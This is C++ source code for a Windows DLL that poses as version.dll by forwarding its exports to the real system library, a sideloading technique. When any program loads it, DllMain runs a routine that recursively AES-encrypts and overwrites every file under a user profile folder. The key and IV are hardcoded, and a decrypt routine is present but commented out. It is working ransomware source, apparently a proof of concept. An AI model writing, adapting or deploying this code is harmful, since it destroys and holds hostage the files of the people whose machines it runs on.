#include <iostream>
#include <fstream>
#include "modes.h"
#include "aes.h"
#include "filters.h"
#include <iostream>
#include <filesystem>
#include <windows.h>

#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.dll.GetFileVersionInfoByHandle")
#pragma comment(linker, "/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoExA")
#pragma comment(linker, "/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoW")
#pragma comment(linker, "/export:VerFindFileA=C:\\Windows\\System32\\version.dll.VerFindFileA")
#pragma comment(linker, "/export:VerFindFileW=C:\\Windows\\System32\\version.dll.VerFindFileW")
#pragma comment(linker, "/export:VerInstallFileA=C:\\Windows\\System32\\version.dll.VerInstallFileA")
#pragma comment(linker, "/export:VerInstallFileW=C:\\Windows\\System32\\version.dll.VerInstallFileW")
#pragma comment(linker, "/export:VerLanguageNameA=C:\\Windows\\System32\\version.dll.VerLanguageNameA")
#pragma comment(linker, "/export:VerLanguageNameW=C:\\Windows\\System32\\version.dll.VerLanguageNameW")
#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.dll.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.dll.VerQueryValueW")

using namespace std;
using namespace CryptoPP;
namespace fs = std::filesystem;


void RansomCrypt() {
    string path = "C:\\Users\\PC";
    CryptoPP::byte key[32], iv[16];
    memset(key, 20, 32);
    memset(iv, 1125884, 16);

    for (const auto& filename : fs::recursive_directory_iterator(path)) {
        try {
            fstream file;
            string cipherText;
            file.open(fs::absolute(filename), fstream::in | ios::binary);
            string contents((istreambuf_iterator<char>(file)), (istreambuf_iterator<char>()));
            file.close();
            AES::Encryption aesEncryption(key, 16);
            CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, iv);
            StreamTransformationFilter stfEncryptor(cbcEncryption, new StringSink(cipherText));
            stfEncryptor.Put(reinterpret_cast<const unsigned char*>(contents.c_str()), contents.length());
            stfEncryptor.MessageEnd();
            file.open(fs::absolute(filename), fstream::out | fstream::trunc | ios::binary);
            file << cipherText;
            file.close();
        }
        catch (...) {}
    }
    system("start calc");
    exit(0);
}

void RansomDecrypt() {
    string path = "C:\\Users\\PC";
    CryptoPP::byte key[32], iv[16];
    memset(key, 20, 32);
    memset(iv, 1125884, 16);

    for (const auto& filename : fs::recursive_directory_iterator(path)) {
        try {
            fstream file;
            string plainText;
            file.open(fs::absolute(filename), fstream::in | ios::binary);
            string contents((istreambuf_iterator<char>(file)), (istreambuf_iterator<char>()));
            file.close();
            AES::Decryption aesDecryption(key, 16);
            CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, iv);
            StreamTransformationFilter stfDecryptor(cbcDecryption, new StringSink(plainText));
            stfDecryptor.Put(reinterpret_cast<const unsigned char*>(contents.c_str()), contents.length());
            stfDecryptor.MessageEnd();
            file.open(fs::absolute(filename), fstream::out | fstream::trunc | ios::binary);
            file << plainText;
            file.close();
        }
        catch (...) {}
    }
    system("start calc");
    exit(0);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        RansomCrypt();
        //RansomDecrypt();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}